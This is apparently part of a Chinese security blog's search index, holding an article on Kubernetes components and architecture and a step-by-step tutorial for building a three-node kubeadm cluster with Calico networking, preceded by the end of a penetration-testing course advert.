课程均为本地搭建环境，仅为技术交流学习，切不可用于非法用途，违法必究！知识付费，才是高质量知识输出的最佳实践!</p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675479051966-03bdbc50-c3c1-43e9-8633-a4a70aafd475.png" alt="img"></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675479059212-1aac3754-cbc9-49f1-bc01-4b4ccc84cfb3.png" alt="img"></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675479070498-8d77cee9-637e-4c57-a879-f0da45cfcf60.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 安全培训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透培训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K8S组件和架构</title>
      <link href="2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/"/>
      <url>2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/</url>
      
        <content type="html"><![CDATA[<p>k8s 主要由以下核心组件组成：</p><ul><li>API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发行等机制，该服务运行在Master节点上。</li><li>etcd 保存了整个集群的状态，该服务运行在Master节点上。</li><li>Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等，该服务运行在Master节点上。</li><li>Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上，该服务运行在Master节点上。</li><li>Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理。该服务运行在所有的Master和node节点上。</li><li>Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI）。该服务运行在所有的Master和node节点上。</li><li>Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡。该服务运行在所有的Master和node节点上。</li></ul><p>以下是 K8s 架构图。</p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1670224498767-deb6faf9-e203-4544-99ee-be357e9486ef.png" alt="img"></p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1670405274291-3beb40fb-f2c9-426c-b8fb-879689ca3f74.png" alt="img"></p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1658474960415-4c4e3e36-1ae5-4f52-a383-114017e8470a.png" alt="img"></p><h2 id="Master控制节点"><a href="#Master控制节点" class="headerlink" title="Master控制节点"></a>Master控制节点</h2><p>Master节点是Kubernetes集群的控制节点，每个Kubernetes集群里至少有一个Master节点，它负责整个集群的决策（如调度），发现和响应集群的事件。一个集群通常运行多个Master控制节点，提供容错性和高可用性。Master节点可以运行在集群中的任意一个节点上，但是最好将Master节点作为一个独立节点，不在该节点上创建容器，因为如果该节点出现问题导致宕机或不可用，整个集群的管理就会失效。</p><p>在Master节点上，会运行以下服务：</p><ul><li>kube-apiserver</li><li>etcd</li><li>kube-scheduler</li><li>kube-controller-manager</li></ul><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1669281171104-f940b9b1-4dee-4057-9e67-374022b80a65.png" alt="img"></p><p>在Master节点上，还会运行以下服务：</p><ul><li>kubelet</li><li>kube-proxy</li><li>Container Runtime：在集群内每个节点上都会安装Container Runtime容器运行时环境，以使Pod可以在上运行。可以是Docker或者其他容器平台如container。</li></ul><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1669281082887-bd341f76-43ef-4885-bbc8-460049d31745.png" alt="img"></p><h3 id="kube-apiserver"><a href="#kube-apiserver" class="headerlink" title="kube-apiserver"></a>kube-apiserver</h3><p>此服务负责公开K8s API并处理请求，可以通过K8s API查询和操纵K8s中对象的状态。</p><h3 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h3><p>一致且高度可用的Key-Value键值存储，用作Kubernetes的所有群集数据的后备存储，在K8s中有两个服务需要用到etcd来协同和配置，分别如下</p><ul><li>网络插件 flannel、对于其它网络插件也需要用到 etcd 存储网络的配置信息</li><li>Kubernetes 本身，包括各种对象的状态和元信息配置</li></ul><p>注意：flannel 操作 etcd 使用的是 v2 的 API，而 Kubernetes 操作 etcd 使用的 v3 的 API，所以在下面我们执行 etcdctl 的时候需要设置 ETCDCTL_API 环境变量，该变量默认值为 2。</p><p>etcd实现原理：<a href="http://jolestar.com/etcd-architecture/">http://jolestar.com/etcd-architecture/</a></p><h3 id="kube-scheduler"><a href="#kube-scheduler" class="headerlink" title="kube-scheduler"></a>kube-scheduler</h3><p>调度器，运行在Master上，用于监控节点中的容器运行情况，并挑选节点来创建新的容器。调度决策所考虑的因素包括资源需求，硬件&#x2F;软件&#x2F;策略约束，亲和性和排斥性规范，数据位置，工作负载间干扰和最后期限。</p><h3 id="kube-controller-manager"><a href="#kube-controller-manager" class="headerlink" title="kube-controller-manager"></a>kube-controller-manager</h3><p>控制和管理器，运行在Master上，每个控制器都是独立的进程，但为了降低复杂性，这些控制器都被编译成单一的二进制文件，并以单独的进程运行。</p><h2 id="Node工作节点"><a href="#Node工作节点" class="headerlink" title="Node工作节点"></a>Node工作节点</h2><p>Node 节点是 Kubernetes 集群的工作节点，每个集群中至少需要一台Node节点，它负责真正的运行Pod，当某个Node节点出现问题而导致宕机时，Master会自动将该节点上的Pod调度到其他节点。Node节点可以运行在物理机上，也可以运行在虚拟机中。</p><p>Node节点可以在集群运行期间动态增加，只要整个节点已经正确安装配置和启动了上面的进程。在默认情况下，kubelet会向Master自动注册。一旦Node被接入到集群管理中，kubelet会定时向Master节点汇报自身的情况（操作系统，Docker版本，CPU内存使用情况等），这样Master便可以在知道每个节点的详细情况的同时，还能知道该节点是否是正常运行。当Node节点心跳超时时，Master节点会自动判断该节点处于不可用状态，并会对该Node节点上的Pod进行迁移。</p><p>在Node节点上，通常会运行以下服务：</p><ul><li>kubelet: 此服务会在集群中每个master和Node节点运行，负责K8s Master控制节点和Node工作节点之间的通信，还负责Pod对应的容器创建，启动和停止等任务，以实现集群管理的基本功能。</li><li>kube-proxy: 此服务会在集群中每个master和Node节点运行，是集群中每个Node节点上运行的网络代理，是实现K8s服务概念的一部分。它维护节点上的一些网络规则，这些网络规则会允许从集群内部或外部的网络会话与Pod进行网络通信。</li><li>Container Runtime: 在集群内每个节点上都会安装Container Runtime容器运行时环境，以使Pod可以在上运行。可以是Docker或者其他容器平台如container。</li></ul><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1669281313906-8f7a6782-dd08-4533-84e4-2acba776e425.png" alt="img"></p><h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>Pod是K8s中最小的调度资源单位，是容器或容器的集合，一个Pod中可以有多个容器 ，彼此共享网络和存储等。Pod中的容器都是统一进行调度，并且运行在共享上下文中。一个Pod被定义为一个逻辑的host，它包括一个或多个相对耦合的容器。</p><p>Pod的共享上下文，实际上是一组由namespace、cgroups和其他资源的隔离的集合，意味着Pod中的资源已经是被隔离过了的，而在Pod中的每一个独立的container又对Pod中的资源进行了二次隔离。</p><p>一个 Pod 总是运行在工作节点。工作节点可以有多个 Pod 。控制节点会根据每个工作节点上可用资源的情况，自动调度 Pod（容器组）到最佳的工作节点上。如果运行实例的工作节点关机或被删除，则 Kubernetes Deployment Controller 将在群集中资源最优的另一个工作节点上重新创建一个新的实例。这提供了一种自我修复机制来解决机器故障或维护问题。</p><h2 id="Replication-Controller"><a href="#Replication-Controller" class="headerlink" title="Replication Controller"></a>Replication Controller</h2><p>Replication Controller为Kubernetes的一个核心内容，应用托管到Kubernetes之后，需要保证应用能够持续的运行，Replication Controller就是这个保证的key，主要的功能如下：</p><ul><li>确保pod数量：它会确保Kubernetes中有指定数量的Pod在运行。如果少于指定数量的pod，Replication Controller会创建新的，反之则会删除掉多余的以保证Pod数量不变。</li><li>确保pod健康：当pod不健康，运行出错或者无法提供服务时，Replication Controller也会杀死不健康的pod，重新创建新的。</li><li>弹性伸缩 ：在业务高峰或者低峰期的时候，可以通过Replication Controller动态的调整pod的数量来提高资源的利用率。同时，配置相应的监控功能（Hroizontal Pod Autoscaler），会定时自动从监控平台获取Replication Controller关联pod的整体资源使用情况，做到自动伸缩。</li><li>滚动升级：滚动升级为一种平滑的升级方式，通过逐步替换的策略，保证整体系统的稳定，在初始化升级的时候就可以及时发现和解决问题，避免问题不断扩大。</li></ul><h2 id="Deploment"><a href="#Deploment" class="headerlink" title="Deploment"></a>Deploment</h2><p>在kubernetes中，Pod是最小的控制单元，但是kubernetes很少直接控制Pod，一般都是通过Pod控制器来完成的。Pod控制器用于Pod的管理，确保Pod资源符合预期的状态，当pod的资源出现故障时，会尝试进行重启或重建Pod。在kubernetes中Pod控制器的种类有很多，Deployment 是最常用的那种。Deployment是K8s用于管理Pod的资源对象，用来保证K8s中Pod的多实例、高可用与滚动更新、灰度部署等。可以说，Deployment是K8s中最常用最有用的一个对象，多用来发布无状态的应用。</p><p>单独创建pod的时候就不会有deployment出现，但是创建deployment的时候一定会创建pod，因为pod是一个基础的单位。任何的控制器单位的具体实现必须落到pod去实现。</p><p>Deployment是比Replication Controller更高级的一种资源，它不但可以控制Pod的副本数，同时还可以控制Pod的版本，所以这么高级的资源并不是时时刻刻都需要的，比如你就想暂时性的部署一个小程序，用完就不要了，那么你就没有必要使用RS或者RC，更没有必要去用Deploment。</p><p>从开发者角度看，deployment顾明思意，既部署，对于完整的应用部署流程，除了运行代码(既pod)之外，需要考虑更新策略，副本数量，回滚，重启等步骤，而运行代码的方式有很多种，例如有一次性的也就是job，有定时执行的也就是crontabjob，有排号的也就是sts，为了复用运行代码的功能所以抽象为pod，从而进行复用。</p><p>从用户角度看，我们操作时也会根据不同的代码副本进行查看，例如日志，资源占用都是实例级别的也需要这么一个抽象。 </p><p>Deployment同样为Kubernetes的一个核心内容，主要职责同样是为了保证pod的数量和健康，90%的功能与Replication Controller完全一样，可以看做新一代的Replication Controller。但是，它又具备了Replication Controller之外的新特性：</p><ul><li>Replication Controller全部功能：Deployment继承了上面描述的Replication Controller全部功能。</li><li>事件和状态查看：可以查看Deployment的升级详细进度和状态。</li><li>回滚：当升级pod镜像或者相关参数的时候发现问题，可以使用回滚操作回滚到上一个稳定的版本或者指定的版本。</li><li>版本记录: 每一次对Deployment的操作，都能保存下来，给予后续可能的回滚使用。</li><li>暂停和启动：对于每一次升级，都能够随时暂停和启动。</li><li>多种升级方案：Recreate：删除所有已存在的pod,重新创建新的; RollingUpdate：滚动升级，逐步替换的策略，同时滚动升级时，支持更多的附加参数，例如设置最大不可用pod数量，最小升级间隔时间等等。</li></ul><p>参考：<a href="https://mp.weixin.qq.com/s/p-yaDl_PtT2LJVcHSYJnzw">https://mp.weixin.qq.com/s/p-yaDl_PtT2LJVcHSYJnzw</a></p><p><a href="https://mp.weixin.qq.com/s/nDnjlm3A-KdpbUCMBQzKrw">K8s学习笔记——Deployment</a></p><h3 id="Replication-Set"><a href="#Replication-Set" class="headerlink" title="Replication Set"></a>Replication Set</h3><p>前面提到，Deployment是Pod的其中一个管理者，这其实也不准确，Deployment控制器也不直接操纵Pod。应用存在副本、版本，如果直接Deployment控制器直接管理Pod，对于版本管理、灰度部署、滚动更新等功能就比较麻烦，因此在Deployment和Pod直接还存在一个ReplicaSet的对象，它是对对应着不同不Pod版本，是Pod直接管理者。Deployment通过操纵ReplicaSet间接的管理Pod：</p><p>如图所示描述了在 replicas&#x3D;5 的设置下，灰度部署（滚动更新）2&#x2F;5的时候，Deployment的状态。我们不用直接创建ReplicaSet，在创建Deployment的时候，K8s会默认创建ReplicaSet，并由Deployment控制器进行管理。K8s也不建议人工管理ReplicaSet。</p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1666753688411-87c196b9-4747-41aa-8ef0-194d37773d4a.png" alt="img"></p><h3 id="创建deployment"><a href="#创建deployment" class="headerlink" title="创建deployment"></a>创建deployment</h3><p>执行如下命令输出一个yaml模板</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubectl create deploy nginx<span class="token operator">-</span>deploy <span class="token operator">-</span><span class="token operator">-</span>image<span class="token operator">=</span>nginx<span class="token punctuation">:</span>alpine <span class="token operator">-</span><span class="token operator">-</span>dry<span class="token operator">-</span>run<span class="token operator">=</span>client <span class="token operator">-</span>o yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1666753265388-faecd1ea-21c4-4ef0-ac6b-67b3e2dbf47d.png" alt="img"></p><ul><li>spec下面的replicas参数代表的是副本数，用户描述希望创建多少个pod，默认为1。通过副本数字段，我们可以提高应用的可用性，减少因意外导致旧Pod被删除、新Pod未起引起可用性下降的问题。此外，K8s集群会监控Deployment的中Pod的状态，如果Pod因意外被删除，导致集群中的Pod数量低于期望的replicas，K8s会自动创建Pod，以达到yaml中对replicas的期望值。</li><li>spec下面的selector参数作用是“筛选”出要被 Deployment 管理的 Pod 对象，筛选的规则是通过下面的“matchLabels”字段，定义了 Pod 对象应该携带的 label。它必须和“template”里 Pod 定义的“labels”完全相同（指name相同的label值相同，不是要具有Pod所有的labels），否则 Deployment 就会找不到要控制的 Pod 对象，apiserver 也会告诉你 yaml 格式校验错误无法创建。</li><li>spec下面的template参数定义了pod应该是什么样的，它其实就是Pod资源对象中的内容。K8s会根据spec.replicas字段，创建出spec.replicas个Pod，每个Pod描述样子就是spec.template所描述的。</li></ul><p>我们将这个yaml模板spec下的replicas参数修改为3，然后保存为1.yml文件，执行如下命令在指定test命名空间下进行部署。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#使用yml文件在指定test命名空间下创建部署</span>kubectl <span class="token builtin">apply</span> <span class="token operator">-</span>f <span class="token number">1</span><span class="token punctuation">.</span>yml <span class="token operator">-</span>n test<span class="token comment">#查看部署</span>kubectl get deploy nginx<span class="token operator">-</span>deploy <span class="token operator">-</span>n test<span class="token comment">#查看指定命名空间下的pod</span>kubectl get pods <span class="token operator">-</span>n test<span class="token comment">#查看 Deployment 创建的 ReplicaSet</span>kubectl get replicaSet <span class="token operator">-</span>A<span class="token comment">#使用yam文件在指定test命名空间下删除部署</span>kubectl delete <span class="token operator">-</span>f <span class="token number">1</span><span class="token punctuation">.</span>yml <span class="token operator">-</span>n test<span class="token comment">#在指定test命名空间下创建一个名为nginx的deployment部署</span>kubectl create deployment nginx<span class="token operator">-</span>deploy2 <span class="token operator">-</span><span class="token operator">-</span>image<span class="token operator">=</span>nginx<span class="token punctuation">:</span>alpine <span class="token operator">-</span><span class="token operator">-</span>port<span class="token operator">=</span><span class="token number">8080</span> <span class="token operator">-</span>n test<span class="token comment">#使用名字删除部署</span>kubectl delete deployments<span class="token punctuation">.</span>apps nginx<span class="token operator">-</span>deploy2 <span class="token operator">-</span>n test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图所示，因为spec下的replicas参数为3，所以创建了3个pod。</p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1666754837174-ad6d2859-acf8-4b3d-a0ea-d3d4fd40650e.png" alt="img"></p><p>此时删除指定的pod，可以看到，指定的pod确实删除了，但是又新生成了重新的pod。因为spec下的replicas参数值为3，所以这个deployment需要3个pod。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubectl delete pod nginx<span class="token operator">-</span>deploy<span class="token operator">-</span>5db48f768c<span class="token operator">-</span>28mxh <span class="token operator">-</span>n test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1666754552272-6d20416b-a3c8-46e4-a66d-f5300e47c465.png" alt="img"></p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>K8s使用命名空间实现集群内部的逻辑隔离，Namespace可实现容器隔离及一些权限控制等。Namespace用于对k8s中资源对象的分组。namespace之间没有嵌套或层级关系。一个资源对象只能属于一个namespace。不同组之间的对象是隔离的，互相不可见。</p><p>以下是K8s安装完成后默认的一些namespace。</p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1669087523956-804bac02-3cd7-48ef-ac19-a037d464447f.png" alt="img"></p><p>注意：namespace无法保证网络的隔离性，比如说service可以跨namespace访问。</p><h3 id="kube-system"><a href="#kube-system" class="headerlink" title="kube-system"></a>kube-system</h3><p>K8s系统自己运行所需的资源对象所在的namespace。</p><h3 id="kube-public"><a href="#kube-public" class="headerlink" title="kube-public"></a>kube-public</h3><p>k8s自动创建的namespace，对所有用户可见。适合放置集群范围都可见的服务。kube-public 含有一个单一的 ConfigMap 对象 cluster-info，它有助于发现和安全引导。该命名空间默认不允许被删除。</p><p><img src="/2022/10/25/yun-an-quan/k8s-zu-jian-he-jia-gou/1669087942531-d97a9019-a896-4274-8a51-bb75a183730e.png" alt="img"></p><h3 id="kube-node-lease"><a href="#kube-node-lease" class="headerlink" title="kube-node-lease"></a>kube-node-lease</h3><p>kube-node-lease 这个命名空间含有与每个节点关联的 Lease 对象。节点 lease 允许 kubelet 发送 heartbeat（心跳），以便控制平面（节点控制器）可以检测节点故障。那么，如果删除了 kube-node-lease，会发生什么？Kubernetes 通常会为每个节点创建另一个带有 Lease 对象的对象，但有时命名空间移除操作会在终止状态卡住。到那时我们会有一个节点 Lease，过时的 heartbeat 可能会告诉节点控制器：该节点访问不了，从而影响节点之间的整体通信。</p><h3 id="default"><a href="#default" class="headerlink" title="default"></a>default</h3><p>K8s默认的namespace，如果操作不指明namespace，默认会操作名为default的namespace。</p><h3 id="kubernetes-dashboard"><a href="#kubernetes-dashboard" class="headerlink" title="kubernetes-dashboard"></a>kubernetes-dashboard</h3><p>如果安装了dashboard，那么该命名空间为dashboard所在的namespace。</p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K8S环境搭建</title>
      <link href="2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/"/>
      <url>2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<p>​    以下演示手动使用kubeadm和minikube安装K8s环境。</p><h1 id="手动使用kubeadm安装"><a href="#手动使用kubeadm安装" class="headerlink" title="手动使用kubeadm安装"></a>手动使用kubeadm安装</h1><table><thead><tr><th><strong>主机名</strong></th><th><strong>ip</strong></th><th><strong>系统版本</strong></th></tr></thead><tbody><tr><td>k8s-master</td><td>172.16.200.70</td><td>Centos7</td></tr><tr><td>k8s-node1</td><td>172.16.200.71</td><td>Centos7</td></tr><tr><td>k8s-node2</td><td>172.16.200.72</td><td>Centos7</td></tr></tbody></table><p>前期准备好三台Centos7机器，均配置如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 关闭防火墙</span>systemctl stop firewalldsystemctl disable firewalld<span class="token comment"># 永久关闭selinux</span>sed <span class="token operator">-</span>i <span class="token string">'s/enforcing/disabled/'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>selinux<span class="token operator">/</span>config<span class="token comment"># 永久关闭swap</span>sed <span class="token operator">-</span>ri <span class="token string">'s/.*swap.*/#&amp;/'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>fstab<span class="token comment"># 修改/etc/hosts</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.70</span> k8s<span class="token operator">-</span>master<span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.71</span> k8s<span class="token operator">-</span>node1<span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.72</span> k8s<span class="token operator">-</span>node2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在三台机器上均安装docker、kubeadm、kubelet，在master节点安装kubectl</p><p>配置阿里云的K8s源</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cat <span class="token operator">></span> <span class="token operator">/</span>etc<span class="token operator">/</span>yum<span class="token punctuation">.</span>repos<span class="token punctuation">.</span>d<span class="token operator">/</span>kubernetes<span class="token punctuation">.</span>repo <span class="token operator">&lt;&lt;</span> EOF<span class="token punctuation">[</span>kubernetes<span class="token punctuation">]</span>name<span class="token operator">=</span>Kubernetesbaseurl<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kubernetes<span class="token operator">/</span>yum<span class="token operator">/</span>repos<span class="token operator">/</span>kubernetes<span class="token operator">-</span>el7<span class="token operator">-</span>x86_64enabled<span class="token operator">=</span><span class="token number">1</span>gpgcheck<span class="token operator">=</span><span class="token number">0</span>repo_gpgcheck<span class="token operator">=</span><span class="token number">0</span>gpgkey<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kubernetes<span class="token operator">/</span>yum<span class="token operator">/</span>doc<span class="token operator">/</span>yum<span class="token operator">-</span>key<span class="token punctuation">.</span>gpg https<span class="token punctuation">:</span><span class="token operator">//</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kubernetes<span class="token operator">/</span>yum<span class="token operator">/</span>doc<span class="token operator">/</span>rpm<span class="token operator">-</span>package<span class="token operator">-</span>key<span class="token punctuation">.</span>gpgEOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装docker就不赘述了。</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665060961426-79917040-21f1-4548-b621-69635ec30deb.png" alt="img"></p><p>执行如下命令安装kubelet、kubeadm和kubectl</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#安装kubelet、kubeadm和kubectl</span>yum install <span class="token operator">-</span>y kubelet<span class="token operator">-</span><span class="token number">1.23</span><span class="token number">.0</span> kubeadm<span class="token operator">-</span><span class="token number">1.23</span><span class="token number">.0</span> kubectl<span class="token operator">-</span><span class="token number">1.23</span><span class="token number">.0</span><span class="token comment">#设置kubelet开机自启</span>systemctl enable kubelet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665061131902-a5fa640f-9bda-4563-9df3-10e5d5f10421.png" alt="img"></p><h2 id="部署K8S-master"><a href="#部署K8S-master" class="headerlink" title="部署K8S-master"></a>部署K8S-master</h2><p>​    在Kubernetes中Master节点是集群的控制节点，它是由三个紧密协作的独立组件组合而成，分别是负责API服务的kube-apiserver、负责调度的kube-scheduler以及负责容器编排的kube-controller-manager，其中整个集群的持久化数据由kube-apiserver处理后保存在etcd中。</p><p>​    在master节点执行如下命令初始化master，需要指定service-cidr和pod-network-cidr</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubeadm init <span class="token operator">-</span><span class="token operator">-</span>apiserver<span class="token operator">-</span>advertise<span class="token operator">-</span>address<span class="token operator">=</span><span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.70</span> <span class="token operator">-</span><span class="token operator">-</span>image<span class="token operator">-</span>repository<span class="token operator">=</span>registry<span class="token punctuation">.</span>aliyuncs<span class="token punctuation">.</span>com<span class="token operator">/</span>google_containers <span class="token operator">-</span><span class="token operator">-</span>kubernetes<span class="token operator">-</span>version v1<span class="token punctuation">.</span><span class="token number">23.0</span> <span class="token operator">-</span><span class="token operator">-</span>service<span class="token operator">-</span>cidr<span class="token operator">=</span><span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span><span class="token operator">-</span>pod<span class="token operator">-</span>network<span class="token operator">-</span>cidr<span class="token operator">=</span><span class="token number">10.20</span><span class="token number">.20</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span><span class="token operator">-</span>ignore<span class="token operator">-</span>preflight<span class="token operator">-</span>errors<span class="token operator">=</span><span class="token builtin">all</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这两个地址在后面我们搭建完K8s后，查询pod和services可以看到。</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1667897051366-6c91a195-b496-468d-bf8c-c460d9bcb0da.png" alt="img"></p><p>然后拷贝k8s认证文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mkdir <span class="token operator">-</span>p $HOME<span class="token operator">/</span><span class="token punctuation">.</span>kubesudo cp <span class="token operator">-</span>i <span class="token operator">/</span>etc<span class="token operator">/</span>kubernetes<span class="token operator">/</span>admin<span class="token punctuation">.</span>conf $HOME<span class="token operator">/</span><span class="token punctuation">.</span>kube<span class="token operator">/</span>configsudo chown $<span class="token punctuation">(</span><span class="token builtin">id</span> <span class="token operator">-</span>u<span class="token punctuation">)</span><span class="token punctuation">:</span>$<span class="token punctuation">(</span><span class="token builtin">id</span> <span class="token operator">-</span>g<span class="token punctuation">)</span> $HOME<span class="token operator">/</span><span class="token punctuation">.</span>kube<span class="token operator">/</span>config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里记住kubeadm join这条命令，在node节点执行这条命令加入集群。</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665063307155-a6bf937c-5160-4ce1-9427-a984921569b8.png" alt="img"></p><h2 id="部署K8S-node"><a href="#部署K8S-node" class="headerlink" title="部署K8S-node"></a>部署K8S-node</h2><p>​    这里在两个node节点执行如下命令即可加入K8S集群</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubeadm join <span class="token number">172.16</span><span class="token number">.200</span><span class="token number">.70</span><span class="token punctuation">:</span><span class="token number">6443</span> <span class="token operator">-</span><span class="token operator">-</span>token y05mrn<span class="token punctuation">.</span>y5yz5g0zvjyanos5 <span class="token operator">-</span><span class="token operator">-</span>discovery<span class="token operator">-</span>token<span class="token operator">-</span>ca<span class="token operator">-</span>cert<span class="token operator">-</span><span class="token builtin">hash</span> sha256<span class="token punctuation">:</span>683c265dcc24cdf2f1a677f0bd38236326514d4270d2d62b602912bf8f70c22e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665064283230-8fdf951e-0e51-4248-818b-6811a8221051.png" alt="img"></p><p>​    默认token的有效期为24小时，过了24小时之后，该token就不可用了。这时就需要重新创建token，可以在master节点直接如下命令生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubeadm token create <span class="token operator">-</span><span class="token operator">-</span><span class="token keyword">print</span><span class="token operator">-</span>join<span class="token operator">-</span>command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="部署网络"><a href="#部署网络" class="headerlink" title="部署网络"></a>部署网络</h2><p>​    部署K8s的网络可以选择使用Calico网络插件和Falnnel网络插件，我这里选择使用Calico网络插件。</p><p>​    Calico是一个纯三层的数据中心网络方案，是目前K8s主流的网络方案。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">wget https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>projectcalico<span class="token punctuation">.</span>org<span class="token operator">/</span>v3<span class="token punctuation">.</span><span class="token number">19</span><span class="token operator">/</span>manifests<span class="token operator">/</span>calico<span class="token punctuation">.</span>yaml <span class="token operator">-</span><span class="token operator">-</span>no<span class="token operator">-</span>check<span class="token operator">-</span>certificatewget https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>projectcalico<span class="token punctuation">.</span>org<span class="token operator">/</span>manifests<span class="token operator">/</span>calico<span class="token punctuation">.</span>yaml <span class="token operator">-</span><span class="token operator">-</span>no<span class="token operator">-</span>check<span class="token operator">-</span>certificate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    下载完后还需要修改里面定义Pod网络（CALICO_IPV4POOL_CIDR），与之前kubeadm init的 –pod-network-cidr指定的一样。</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665067645119-9af843ed-a163-4e40-9315-3ff9af8da87a.png" alt="img"></p><p>​    默认calico.yaml中所使用的镜像都来源于docker.io国外镜像源，这里我们可以删除docker.io前缀以使镜像从国内镜像加速站点下载。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cat calico<span class="token punctuation">.</span>yaml <span class="token operator">|</span>grep <span class="token string">'image:'</span>sed <span class="token operator">-</span>i <span class="token string">'s#docker.io/##g'</span> calico<span class="token punctuation">.</span>yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1665071566914-9e1b5f89-0b60-4360-a277-f5771af0408e.png" alt="img"></p><p>修改完后文件后，进行部署：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#部署</span>kubectl <span class="token builtin">apply</span> <span class="token operator">-</span>f calico<span class="token punctuation">.</span>yaml<span class="token comment">#查看状态，执行完上一条命令需要等一会才全部running</span>kubectl get pods <span class="token operator">-</span>n kube<span class="token operator">-</span>system                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img 